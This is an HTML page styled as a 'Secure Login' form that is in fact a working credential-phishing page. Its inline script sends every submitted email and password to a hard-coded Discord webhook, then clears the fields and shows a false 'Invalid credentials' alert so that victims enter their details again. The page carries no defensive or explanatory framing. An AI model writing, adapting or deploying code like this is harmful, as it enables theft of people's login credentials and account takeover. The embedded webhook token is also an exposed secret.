<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Modern Secure Login</title>
    <style>
        body {
            background-color: #111;
            color: #eee;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background: #222;
            padding: 20px 40px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
        }
        .login-container h1 {
            color: #fff;
            margin-bottom: 20px;
        }
        .login-container input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 4px;
            outline: none;
            background: #333;
            color: #eee;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 4px;
            background: #0f0;
            color: #000;
            font-weight: bold;
            cursor: pointer;
        }
        .login-container button:hover {
            background: #0c0;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Secure Login</h1>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Send data to the Discord webhook
            fetch('https://discord.com/api/webhooks/1325464149404160010/Dr6gpVlTmJX0277UJIiLC2mN2YDrTg0kEUQrq10gUKmCj3v-iTkwgHdfe0nhOKaiAkuo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `Email: ${email}\nPassword: ${password}`
                })
            });

            // Clear input fields
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            
            alert('Invalid credentials. Please try again.');
        });
    </script>
</body>
</html>
